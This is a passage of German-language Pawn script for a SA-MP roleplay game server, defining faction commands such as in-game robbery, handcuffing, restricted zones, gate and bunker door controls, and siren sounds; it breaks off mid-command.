    if(!IstSpielerInFrak(playerid,3) && !IstSpielerInFrak(playerid,4)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Feuerwehrmann!");
    {
   		if(IsPlayerAttachedObjectSlotUsed(playerid,7))
     	{
      		RemovePlayerAttachedObject(playerid,7);
     	}
      	else
       	{
            SetPlayerAttachedObject(playerid, 7, 19472, 2, -0.0079, 0.1549, 0.0039, 22.8000, 87.1000, 73.9999, 1.0000, 1.0000, 1.0000, 0xFFFFFFFF, 0xFFFFFFFF);
        }
        return 1;
	}
}
cmd:weste(playerid,params[])
{
    printf("%s weste",PlayerName(playerid));
    if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
    {
   		if(IsPlayerAttachedObjectSlotUsed(playerid,3))
     	{
      		RemovePlayerAttachedObject(playerid,3);
     	}
      	else
       	{
        	SetPlayerAttachedObject(playerid, 3, 19142, 1, 0.1079, 0.0379, 0.0000, -7.1000, 0.0000, 0.0000, 1.0000, 1.1350, 1.0000, 0xFFFFFFFF, 0xFFFFFFFF);
        }
        return 1;
	}
}
cmd:radioa(playerid,params[])
{
    printf("%s radioa",PlayerName(playerid));
    if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
    {
   		if(IsPlayerAttachedObjectSlotUsed(playerid,9))
     	{
      		RemovePlayerAttachedObject(playerid,9);
     	}
      	else
       	{
        	SetPlayerAttachedObject(playerid, 9, 19942, 1, -0.2190, -0.0030, 0.1529, -80.6000, 93.0000, 24.2000, 1.0000, 1.0000, 1.0000, 0xFFFFFFFF, 0xFFFFFFFF);
        }
        return 1;
	}
}
cmd:rauben(playerid,params[])
{
	new pID,str[128],Float:X,Float:Y,Float:Z,str2[128];
	if(sscanf(params,"u",pID))return SendClientMessage(playerid,COLOR_RED,"Benutze /rauben [Name/ID]");
	if(rob_sperre[playerid] == true) return SendClientMessage(playerid,COLOR_RED,"Du kannst nur alle 15. Minuten jemanden ausrauben.");
	if(SpielerInfo[pID][uGeld] <=0) return SendClientMessage(playerid,COLOR_RED,"Der Spieler hat 0 oder weniger $ auf der Hand. Raub fehlgeschlagen!");
	if(inROB[playerid] == true) return SendClientMessage(playerid,COLOR_RED,"Du raubst bereits jemanden aus!");
	if(SpielerInfo[pID][uAFK] == 300) return SendClientMessage(playerid,COLOR_RED,"Der Spieler ist im AFK Modus!");
	if(GetPlayerScore(pID) < 3) return SendClientMessage(playerid,COLOR_RED,"Der Spieler ist nicht Level 3!");
	if(playerid != pID)
	{
		GetPlayerPos(pID,X,Y,Z);
		if(!IsPlayerInRangeOfPoint(playerid,2.0,X,Y,Z))return SendClientMessage(playerid,-1,"Du bist nicht in der Nähe des Spieler´s.");
		format(str,sizeof(str),"{EB0000}ACHTUNG! {FAFAFA}Du wirst von %s ausgeraubt, du hast 10 Sekunden Zeit wegzurennen!",PlayerName(playerid));
		SendClientMessage(pID,-1,str);
		SendClientMessage(playerid,-1,"Du hast einen Raub gestartet, halte dich 10 Sekunden in der Nähe des Spieler´s auf.");
		format(str2, sizeof(str2), "%s versucht %s auszurauben...", PlayerName(playerid),PlayerName(pID));
		SendRadiusMessage(playerid,20.0,str2,COLOR_PURPLE);
		inROB[playerid]=true;
		rob_targetID[playerid]=pID;
		robTM[playerid] = SetTimerEx("rob_timer", 10000, false, "i", playerid);
 	}
 	else
 	{
 	    SendClientMessage(playerid,COLOR_RED,"Du kannst dich nicht selber ausrauben!");
 	}
	return 1;
}

cmd:sperrzone(playerid,params[])
{
    printf("%s sperrzone",PlayerName(playerid));
    if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
    new string[265];
	new strings [10];
    if(sscanf(params,"s",strings)) return SendClientMessage(playerid,COLOR_RED,"Benutze /sperrzone [Pos1 | Pos2 | erstellen | entfernen]");
	if(SpielerInfo[playerid][uDienst] != 1) return SendClientMessage(playerid,COLOR_RED,"Du bist nicht im Dienst");
    if(strcmp(strings,"Pos1", true) == 0)
    {
        new Float:temp;
        if(sperrzone == 0)
        {
	        GetPlayerPos(playerid,sperre[0],sperre[1],temp);
	        SendClientMessage(playerid,COLOR_GREEN,"Markiere nun Position 2.");
 		}
 		else{SendClientMessage(playerid,COLOR_RED,"Es besteht bereits eine Sperrzone! (/sperrzone entfernen)");}
    }
    else if(strcmp(strings,"Pos2", true) == 0)
    {
        if(sperrzone == 0)
        {
        	new Float:temp;
        	GetPlayerPos(playerid,sperre[2],sperre[3],temp);
        	SendClientMessage(playerid,COLOR_GREEN,"Wenn du beide Positionen erstellt hast. Führe diesen Befehl aus: (/sperrzone erstellen)");
        }
 		else{SendClientMessage(playerid,COLOR_RED,"Es besteht bereits eine Sperrzone! (/sperrzone entfernen)");}
    }
    else if(strcmp(strings,"erstellen", true) == 0)
    {
        if(sperrzone == 0)
        {
            new Float:temp;
	        SendClientMessage(playerid,COLOR_GREEN,"Die Sperrzone erstellt! (/sperrzone entfernen)");
			sperrzone = 1;
			if(sperre[0] > sperre[2])
			{
				temp = sperre[0];
				sperre[0] = sperre[2];
				sperre[2] = temp;
			}
			if(sperre[1] > sperre[3])
			{
				temp = sperre[1];
				sperre[1] = sperre[3];
				sperre[3] = temp;
				temp = 0.0;
			}
			format(string,sizeof string,"HQ: %s hat eine Sperrzone erstellt! Diese darf von Zivilisten nicht betreten werden!",PlayerName(playerid));
			SendClientMessageToAll(COLOR_HQ,string);
			sperrzonef = GangZoneCreate(sperre[0],sperre[1],sperre[2],sperre[3]);
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
			    if(SpielerInfo[i][uEingeloggt] == 1)
			    {
				 	GangZoneShowForPlayer(i,sperrzonef, 0xE10000AA);
				 	GangZoneFlashForPlayer(i,sperrzonef,0x0069FFAA);
				}
			}
		}else{SendClientMessage(playerid,COLOR_RED,"Es besteht bereits eine Sperrzone! (/sperrzone entfernen)");}
    }
    else if(strcmp(strings,"entfernen", true) == 0)
    {
        if(sperrzone == 1)
        {
	        SendClientMessage(playerid,COLOR_GREEN,"Du hast die Sperrzone entfernt!");
			sperrzone = 0;
			format(string,sizeof string,"HQ: %s hat den Sperrbereich freigegeben!",PlayerName(playerid));
			SendClientMessageToAll(COLOR_HQ,string);
		 	GangZoneDestroy(sperrzonef);
		}else{SendClientMessage(playerid,COLOR_RED,"Es besteht keine Sperrzone!");}
    }
    else {SendClientMessage(playerid,COLOR_RED,"Benutze /sperrzone [Pos1 | Pos2 | erstellen | entfernen]");}
	return 1;
}

cmd:handschellen(playerid,params[])
{
    printf("%s handschellen",PlayerName(playerid));
    if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
    new string[60];
	if(sscanf(params,"r",giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Benutze /handschellen [Name/ID]");
	if(EntfernungZwischenSpielern(playerid,giveplayerid) > 2) return SendClientMessage(playerid,COLOR_RED,"Der Spieler ist zu weit entfernt!");
	if(playerid == giveplayerid) return SendClientMessage(playerid,COLOR_RED,"Du kannst diesen Befehl nicht an dir selber ausführen!");
	if(SpielerInfo[playerid][uDienst] != 1) return SendClientMessage(playerid,COLOR_RED,"Du bist nicht im Dienst");
	if(GetPlayerSpecialAction(giveplayerid) == SPECIAL_ACTION_CUFFED)
	{
 		SetPlayerSpecialAction(giveplayerid,0);
		format(string,sizeof string,"%s hat dir die Handschellen gelöst!",PlayerName(playerid));
		SendClientMessage(giveplayerid,COLOR_GREEN,string);
		format(string,sizeof string,"Du hast %s die Handschellen gelöst!",PlayerName(giveplayerid));
		SendClientMessage(playerid,COLOR_GREEN,string);
		Unfreeze(playerid);
	}
	else
	{
	    SetPlayerSpecialAction(giveplayerid,SPECIAL_ACTION_CUFFED);
		format(string,sizeof string,"%s hat dir Handschellen angelegt!",PlayerName(playerid));
		SendClientMessage(giveplayerid,COLOR_RED,string);
		format(string,sizeof string,"Du hast %s Handschellen angelegt!",PlayerName(giveplayerid));
  		SendClientMessage(playerid,COLOR_GREEN,string);
	}
	return 1;
}
cmd:trucktor(playerid,params[])
{
    printf("%s flv",PlayerName(playerid));
    if(SpielerInfo[playerid][uJob] != 5) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Trucker!");
    new nummer,Float:X,Float:Y,Float:Z;
    if(sscanf(params,"d",nummer) || nummer < 1 || nummer > 3) return SendClientMessage(playerid,COLOR_RED,"Benutze /trucktor [1-3]");
    GetDynamicObjectPos(fwstor[nummer-1],X,Y,Z);
    if(Z != 0.90360)
    {
   		MoveDynamicObject(fwstor[nummer-1], X+0.02, Y, 0.90360, 1.5);
   		SetTimerEx("FWTorClose",10000,0,"d",nummer-1);
   	}
	return 1;
}
forward FWTorClose(nummer);
public FWTorClose(nummer)
{
    new Float:X,Float:Y,Float:Z;
    GetDynamicObjectPos(fwstor[nummer],X,Y,Z);
    MoveDynamicObject(fwstor[nummer], X-0.02, Y, 4.90360, 1.5);
}
cmd:sirenean(playerid,params[])
{
    printf("%s sirenean",PlayerName(playerid));
    PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/sirene.mp3");
	return 1;
}
cmd:sireneaus(playerid,params[])
{
    printf("%s sireneaus",PlayerName(playerid));
    StopAudioStreamForPlayer(playerid);
	return 1;
}


cmd:yakuza(playerid,params[])
{
    printf("%s yakuza",PlayerName(playerid));
	new nummer;
	if(!IstSpielerInFrak(playerid,11)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Mitglied der Yakuza!");
	if(sscanf(params, "d", nummer)) return SendClientMessage(playerid,COLOR_RED,"Benutze /yakuza [1-3] um das Rollotor zu öffnen!");
 	if(nummer == 1)
	{
		if(TOROFFEN[20] == 0)
	    {
		  	TOROFFEN[20] = 1;
          	MoveDynamicObject(YakuzaTORE[0],3164.6170, -9242.6943, 6.2026,0.6, 0.0000, 0.0000, 90.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Rollo 1 geöffnet!");
		  	PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/garage.mp3",3164.6170, -9242.6943, 6.2026,20.0, 1);

		}
		else
		{
		    TOROFFEN[20] = 0;
		    MoveDynamicObject(YakuzaTORE[0],3167.99097, -9242.69434, 6.20256,0.60, 0.0000, 0.0000, 90.0000);
            SendClientMessage(playerid,COLOR_RED,"Rollo 1 geschlossen!");
            PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/garage.mp3",3164.6170, -9242.6943, 6.2026,20.0, 1);
     	}
	}
	else if(nummer == 2)
	{
		if(TOROFFEN[19] == 0)
	    {
		  	TOROFFEN[19] = 1;
          	MoveDynamicObject(YakuzaTORE[1],3170.2556, -9230.7939, 2.4889,0.60, 0.0000, 0.0000, 90.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Rollo 2 geöffnet!");
		  	PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/garage.mp3",3170.2556, -9230.7939, 2.4889,20.0, 1);
		}
		else
		{
		    TOROFFEN[19] = 0;
		    MoveDynamicObject(YakuzaTORE[1],3170.25562, -9230.79395, 4.9138,0.60, 0.0000, 0.0000, 90.0000);
            SendClientMessage(playerid,COLOR_RED,"Rollo 2 geschlossen!");
            PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/garage.mp3",3170.2556, -9230.7939, 2.4889,20.0, 1);
     	}
	}
    else if(nummer == 3)
    {
    	if(TOROFFEN[21] == 0)
	    {
		  	TOROFFEN[21] = 1;
          	MoveDynamicObject(YakuzaTORE[2],3165.6475, -9230.7939, 2.4928,0.6, 0.0000, 0.0000, 90.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Rollo 3 geöffnet!");
		  	PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/garage.mp3",3165.6475, -9230.7939, 2.492,20.0, 1);
		}
		else
		{
		    TOROFFEN[21] = 0;
		    MoveDynamicObject(YakuzaTORE[2],3165.64746, -9230.79395, 4.69560,0.6, 0.0000, 0.0000, 90.0000);
            SendClientMessage(playerid,COLOR_RED,"Rollo 3 geschlossen!");
            PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/garage.mp3",3165.6475, -9230.7939, 2.492,20.0, 1);
     	}
	}
	else SendClientMessage(playerid,COLOR_RED,"Benutze /yakuza [1-3] um ein Rollotor zu öffnen!");
	return 1;
}


cmd:lcn(playerid,params[])
{
    printf("%s lcn",PlayerName(playerid));
	new nummer;
	if(!IstSpielerInFrak(playerid,10)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Mitglied der LCN!");
	if(sscanf(params, "d", nummer)) return SendClientMessage(playerid,COLOR_RED,"Benutze /lcn [1-2] um das Tor zu öffnen!");
 	if(nummer == 1)
	{
	 	if(TOROFFEN[17] == 0)
	    {
			TOROFFEN[17] = 1;
          	MoveDynamicObject(LCNTORE[0],6350.1396, -9311.6240, 7.7817,0.20, 0.0000, -84.0000, 0.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Tor 1 geöffnet!");
		  	PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/garage.mp3",6352.10449, -9311.16211, 5.59747,20.0, 1);
		}
		else
		{
	    	TOROFFEN[17] = 0;
		    MoveDynamicObject(LCNTORE[0],6352.10449, -9311.16211, 5.59747,0.20, 0.0000, 0.0000, 0.0000);
            SendClientMessage(playerid,COLOR_RED,"Tor 1 geschlossen!");
            PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/garage.mp3",6352.10449, -9311.16211, 5.59747,20.0, 1);
     	}
	}
	else if(nummer == 2)
	{
		if(TOROFFEN[18] == 0)
	    {
		  	TOROFFEN[18] = 1;
          	MoveDynamicObject(LCNTORE[1],6345.6143, -9327.5449, 9.7073,0.20, 0.0000, 0.0000, 90.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Tor 2 geöffnet!");
		  	PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/garage.mp3",6345.6143, -9327.5449, 9.7073,20.0, 1);
		}
		else
		{
		    TOROFFEN[18] = 0;
		    MoveDynamicObject(LCNTORE[1],6345.61426, -9327.54492, 5.59750,0.20, 0.0000, 0.0000, 90.0000);
      		SendClientMessage(playerid,COLOR_RED,"Tor 2 geschlossen!");
      		PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/garage.mp3",6345.61426, -9327.54492, 5.59750,20.0, 1);

     	}
	}
	else SendClientMessage(playerid,COLOR_RED,"Benutze /lcn [1-2] um eins der beiden Tore zu öffnen!");
	return 1;
}
cmd:bls(playerid,params[])
{
    printf("%s bls",PlayerName(playerid));
	new nummer;
	if(!IstSpielerInFrak(playerid,3) && !IstSpielerInFrak(playerid,4)) return SendClientMessage(playerid,COLOR_RED,"Du bist nicht im Fire & Rescue Department!");
	if(sscanf(params, "d", nummer)) return SendClientMessage(playerid,COLOR_RED,"Benutze /bls [1-2] um die Bühne rauf und runter zufahren!");
 	if(nummer == 1)
	{
    	if(TOROFFEN[0] == 0)
	    {
		  	TOROFFEN[0] = 1;
          	MoveDynamicObject(Buhne[0],1673.34985, -9323.97754, 3.5721,0.20);
		  	PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/buhne.mp3",1673.34985, -9323.97754, 3.5721,20.0, 1);
		  	SendClientMessage(playerid,COLOR_GREEN,"Bühne 1 Hoch");
		}
		else
		{
		    TOROFFEN[0] = 0;
		    MoveDynamicObject(Buhne[0],1673.34985, -9323.97754, 1.79110,0.20);
      		PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/buhne.mp3",1673.34985, -9323.97754, 1.79110,20.0, 1);
            SendClientMessage(playerid,COLOR_RED,"Bühne 1 Runter");
     	}
	}
	else if(nummer == 2)
	{
		if(TOROFFEN[1] == 0)
	    {
		  	TOROFFEN[1] = 1;
          	MoveDynamicObject(Buhne[1],1664.53040, -9323.97754, 3.5721,0.20);
		  	PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/buhne.mp3",1664.53040, -9323.97754, 3.5721,20.0, 1);
		  	SendClientMessage(playerid,COLOR_GREEN,"Bühne 2 Hoch");
		}
		else
		{
		    TOROFFEN[1] = 0;
		    MoveDynamicObject(Buhne[1],1664.53040, -9323.97754, 1.79110,0.20);
      		PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/buhne.mp3",1664.53040, -9323.97754, 1.79110,20.0, 1);
      		SendClientMessage(playerid,COLOR_RED,"Bühne 2 Runter");

     	}
	}
	else SendClientMessage(playerid,COLOR_RED,"Benutze /bls [1-2] um die Bühne rauf und runter zufahren!");
	return 1;
}
cmd:bunker(playerid,params[])
{
    printf("%s bunker",PlayerName(playerid));
	new nummer;
	if(!IstSpielerInFrak(playerid,15) && !IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Cop/Army!");
	if(sscanf(params, "d", nummer)) return SendClientMessage(playerid,COLOR_RED,"Benutze /bunker [1-3]");
	if(nummer == 1)
	{
	    if(BunkerTorx[0] == 0)
		{
		    MoveDynamicObject(BunkerTor[0],1611.40576, -9196.11035, 6.22639-5,0.7);
		    SendClientMessage(playerid,COLOR_GREEN,"Bunktertor 1 geöffnet");
	        BunkerTorx[0] = 1;
	    }
	    else
	    {
	        MoveDynamicObject(BunkerTor[0],1611.40576, -9196.11035, 6.22639,0.7);
	        SendClientMessage(playerid,COLOR_RED,"Bunktertor 1 geschlossen");
	        BunkerTorx[0] = 0;
	    }
	}
	else if(nummer == 2)
	{
	    if(BunkerTorx[1] == 0)
		{
		    MoveDynamicObject(BunkerTor[1],1617.80310, -9202.63184, 6.22640-5,0.7);
		    SendClientMessage(playerid,COLOR_GREEN,"Bunktertor 2 geöffnet");
	        BunkerTorx[1] = 1;
	    }
	    else
	    {
	        MoveDynamicObject(BunkerTor[1],1617.80310, -9202.63184, 6.22640,0.7);
	        SendClientMessage(playerid,COLOR_RED,"Bunktertor 2 geschlossen");
	        BunkerTorx[1] = 0;
	    }
	}
	else if(nummer == 3)
	{
	    if(BunkerTorx[2] == 0)
		{
		    MoveDynamicObject(BunkerTor[2],1623.98999, -9196.04102, 6.22640-5,0.7);
		    SendClientMessage(playerid,COLOR_GREEN,"Bunktertor 3 geöffnet");
	        BunkerTorx[2] = 1;
	    }
	    else
	    {
	        MoveDynamicObject(BunkerTor[2],1623.98999, -9196.04102, 6.22640,0.7);
	        SendClientMessage(playerid,COLOR_RED,"Bunktertor 3 geschlossen");
	        BunkerTorx[2] = 0;
	    }
	}else SendClientMessage(playerid,COLOR_RED,"Benutze /bunker [1-3]");
	return 1;
}

cmd:ator(playerid,params[])
{
    printf("%s ator",PlayerName(playerid));
	new nummer;
	if(!IstSpielerInFrak(playerid,15) && !IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Army!");
	if(sscanf(params, "d", nummer)) return SendClientMessage(playerid,COLOR_RED,"Benutze /ator [1-2]");
	if(nummer == 1)
	{
	    if(armytorx[0] == 0)
		{
		    MoveDynamicObject(armytor[0],4482.6924, -8630.8359, 6.7472,2);
		    SendClientMessage(playerid,COLOR_GREEN,"Tor 1 geöffnet");
	        armytorx[0] = 1;
	    }
	    else
	    {
	        MoveDynamicObject(armytor[0],4496.48438, -8630.79688, 6.74720,2);
	        SendClientMessage(playerid,COLOR_RED,"Tor 1 geschlossen");
	        armytorx[0] = 0;
	    }
	}
	else if(nummer == 2)
	{
	    if(armytorx[1] == 0)
		{
		    MoveDynamicObject(armytor[1],4647.2856, -8738.2031, 6.7472,2);
		    SendClientMessage(playerid,COLOR_GREEN,"Tor 2 geöffnet");
	        armytorx[1] = 1;
	    }
	    else
	    {
	        MoveDynamicObject(armytor[1],4647.25635, -8750.83398, 6.74720,2);
	        SendClientMessage(playerid,COLOR_RED,"Tor 2 geschlossen");
	        armytorx[1] = 0;
	    }
	}
	return 1;
}
cmd:zellen(playerid,params[])
{
    if(!IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist nicht bei der Army!");
	if(ARMYDOORZELLE1 == 0)
	{
	    MoveDynamicObject(ARMYDOORZELLE[0], 4509.88379+1.772, -8689.21973, 4.65460,   0.3);
		MoveDynamicObject(ARMYDOORZELLE[1], 4513.50342+1.772, -8689.21973, 4.65460,   0.3);
		MoveDynamicObject(ARMYDOORZELLE[2], 4517.12646+1.772, -8689.21973, 8.51520,   0.3);
		MoveDynamicObject(ARMYDOORZELLE[3], 4517.12646+1.772, -8689.21973, 4.65460,   0.3);
		MoveDynamicObject(ARMYDOORZELLE[4], 4513.50342+1.772, -8689.21973, 8.51520,   0.3);
		MoveDynamicObject(ARMYDOORZELLE[5], 4509.88379+1.772, -8689.21973, 8.51520,   0.3);
		MoveDynamicObject(ARMYDOORZELLE[6], 4506.26758+1.772, -8689.21973, 8.51526,   0.3);
		MoveDynamicObject(ARMYDOORZELLE[7], 4502.64697+1.772, -8689.21973, 8.51520,   0.3);
		MoveDynamicObject(ARMYDOORZELLE[8], 4502.64697+1.772, -8689.21973, 4.65460,   0.3);
		MoveDynamicObject(ARMYDOORZELLE[9], 4506.26758+1.772, -8689.21973, 4.65460,   0.3);
		ARMYDOORZELLE1 = 1;
	}
	else
	{
	    MoveDynamicObject(ARMYDOORZELLE[0], 4509.88379, -8689.21973, 4.65460,   0.3);
		MoveDynamicObject(ARMYDOORZELLE[1], 4513.50342, -8689.21973, 4.65460,   0.3);
		MoveDynamicObject(ARMYDOORZELLE[2], 4517.12646, -8689.21973, 8.51520,   0.3);
		MoveDynamicObject(ARMYDOORZELLE[3], 4517.12646, -8689.21973, 4.65460,   0.3);
		MoveDynamicObject(ARMYDOORZELLE[4], 4513.50342, -8689.21973, 8.51520,   0.3);
		MoveDynamicObject(ARMYDOORZELLE[5], 4509.88379, -8689.21973, 8.51520,   0.3);
		MoveDynamicObject(ARMYDOORZELLE[6], 4506.26758, -8689.21973, 8.51526,   0.3);
		MoveDynamicObject(ARMYDOORZELLE[7], 4502.64697, -8689.21973, 8.51520,   0.3);
		MoveDynamicObject(ARMYDOORZELLE[8], 4502.64697, -8689.21973, 4.65460,   0.3);
		MoveDynamicObject(ARMYDOORZELLE[9], 4506.26758, -8689.21973, 4.65460,   0.3);
		ARMYDOORZELLE1 = 0;
	}
	return 1;
}
cmd:frtls(playerid,params[])
{
    printf("%s frtls",PlayerName(playerid));
	new nummer;
	if(!IstSpielerInFrak(playerid,3) && !IstSpielerInFrak(playerid,4)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Mitglied des Fire & Rescue Departments!");
	if(sscanf(params, "d", nummer)) return SendClientMessage(playerid,COLOR_RED,"Benutze /frtls [1-4]");
 	if(nummer == 1)
	{
    	if(TOROFFEN[2] == 0)
	    {
		  	TOROFFEN[2] = 1;
          	MoveDynamicObject(Towingdoor[0],1691.4855, -9318.4873, 6.7912,1,    90.0000, 0.0000, 0.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Tor 1 geöffnet");
		  	PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/garage.mp3",1691.48547, -9316.44727, 6.81520,20.0, 1);
		}
		else
		{
		    TOROFFEN[2] = 0;
		    MoveDynamicObject(Towingdoor[0],1691.48547, -9316.44727, 6.81520,1,   0.0000, 0.0000, 0.0000);
		    SendClientMessage(playerid,COLOR_RED,"Tor 1 geschlossen");
		    PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/garage.mp3",1691.48547, -9316.44727, 6.81520,20.0, 1);

     	}
	}
	else if(nummer == 2)
	{
		if(TOROFFEN[3] == 0)
	    {
		  	TOROFFEN[3] = 1;
          	MoveDynamicObject(Towingdoor[1],1682.48596, -9318.4873, 6.7912,1,    90.0000, 0.0000, 0.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Tor 2 geöffnet");
		  	PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/garage.mp3",1682.48596, -9316.44727, 6.81520,20.0, 1);
		}
		else
		{
		    TOROFFEN[3] = 0;
		    MoveDynamicObject(Towingdoor[1],1682.48596, -9316.44727, 6.81520,1,   0.0000, 0.0000, 0.0000);
		    SendClientMessage(playerid,COLOR_RED,"Tor 2 geschlossen");
		    PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/garage.mp3",1682.48596, -9316.44727, 6.81520,20.0, 1);

     	}
	}
	else if(nummer == 3)
	{
		if(TOROFFEN[4] == 0)
	    {
		  	TOROFFEN[4] = 1;
          	MoveDynamicObject(Towingdoor[2],1673.48523, -9318.4873, 6.7912,1,    90.0000, 0.0000, 0.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Tor 3 geöffnet");
		  	PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/garage.mp3",1673.48523, -9318.4873, 6.7912,20.0, 1);
		}
		else
		{
		    TOROFFEN[4] = 0;
		    MoveDynamicObject(Towingdoor[2],1673.48523, -9316.44727, 6.81120,1,   0.0000, 0.0000, 0.0000);
		    SendClientMessage(playerid,COLOR_RED,"Tor 3 geschlossen");
		    PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/garage.mp3",1673.48523, -9318.4873, 6.7912,20.0, 1);

     	}
	}
	else if(nummer == 4)
	{
		if(TOROFFEN[5] == 0)
	    {
		  	TOROFFEN[5] = 1;
          	MoveDynamicObject(Towingdoor[3],1664.48816, -9318.4873, 6.7912,1,    90.0000, 0.0000, 0.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Tor 4 geöffnet");
		  	PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/garage.mp3",1664.48816, -9316.44727, 6.81120,20.0, 1);
		}
		else
		{
		    TOROFFEN[5] = 0;
		    MoveDynamicObject(Towingdoor[3],1664.48816, -9316.44727, 6.81120,1,   0.0000, 0.0000, 0.0000);
		    SendClientMessage(playerid,COLOR_RED,"Tor 4 geschlossen");
		    PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/garage.mp3",1664.48816, -9316.44727, 6.81120,20.0, 1);

     	}
	}
	else SendClientMessage(playerid,COLOR_RED,"Benutze /frtls [1-4]");
	return 1;
}
cmd:unterboden(playerid,params[])
{
	new Float:xx,Float:yy,Float:zz;
    printf("%s unterboden",PlayerName(playerid));
    GetPlayerPos(playerid,xx,yy,zz);
    if(zz < 0.5)
    {
        SetPlayerPos(playerid,xx,yy,zz+10);
        SendClientMessage(playerid,COLOR_GREEN,"Du bist nun wieder über der MAP!");
    }
    else
    {
        SendClientMessage(playerid,COLOR_RED,"Du bist nicht unter der MAP!");
    }
	return 1;
}
cmd:detach(playerid,params[])
{
    printf("%s detach",PlayerName(playerid));
	DetachTrailerFromVehicle(playerid);
	SendClientMessage(playerid,COLOR_RED,"Abgehängt");
	return 1;
}
/*

new trailerid = GetVehicleTrailer(vehicleid);
DetachTrailerFromVehicle(trailerid);

*/

cmd:frmls(playerid,params[])
{
    printf("%s frmls",PlayerName(playerid));
	new nummer;
	if(!IstSpielerInFrak(playerid,3) && !IstSpielerInFrak(playerid,4)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Mitglied des Fire & Rescue Departments!");
	if(sscanf(params, "d", nummer)) return SendClientMessage(playerid,COLOR_RED,"Benutze /frmls [1-5]");
 	if(nummer == 1)
	{
    	if(TOROFFEN[6] == 0)
	    {
		  	TOROFFEN[6] = 1;
          	MoveDynamicObject(medictorls[3],1748.5960, -9316.0780, 6.9420,1,    0.0000, 270.0000, -90.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Tor 1 geöffnet");
		}
		else
		{
		    TOROFFEN[6] = 0;
		    MoveDynamicObject(medictorls[3],1748.5944, -9314.2676, 4.9092,1,   0.00000, 180.00000, -90.00000);
		    SendClientMessage(playerid,COLOR_RED,"Tor 1 geschlossen");

     	}
	}
	else if(nummer == 2)
	{
		if(TOROFFEN[7] == 0)
	    {
		  	TOROFFEN[7] = 1;
          	MoveDynamicObject(medictorls[4],1742.79150, -9316.0780, 6.9420,1,    0.0000, 270.0000, -90.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Tor 2 geöffnet");
		}
		else
		{
		    TOROFFEN[7] = 0;
		    MoveDynamicObject(medictorls[4],1742.79150, -9314.26758, 4.90920,1,   0.00000, 180.00000, -90.00000);
		    SendClientMessage(playerid,COLOR_RED,"Tor 2 geschlossen");

     	}
	}
	else if(nummer == 3)
	{
	    if(TOROFFEN[8] == 0)
	    {
		  	TOROFFEN[8] = 1;
          	MoveDynamicObject(medictorls[1],1736.99756, -9316.0780, 6.9420,1,    0.0000, 270.0000, -90.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Tor 3 geöffnet");
		}
		else
		{
		    TOROFFEN[8] = 0;
		    MoveDynamicObject(medictorls[1],1736.99756, -9314.26758, 4.90920,1,   0.00000, 180.00000, -90.00000);
		    SendClientMessage(playerid,COLOR_RED,"Tor 3 geschlossen");

     	}
	}
	else if(nummer == 4)
	{
 		if(TOROFFEN[9] == 0)
	    {
		  	TOROFFEN[9] = 1;
          	MoveDynamicObject(medictorls[0],1731.19287, -9316.0780, 6.9420,1,    0.0000, 270.0000, -90.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Tor 4 geöffnet");
		}
		else
		{
		    TOROFFEN[9] = 0;
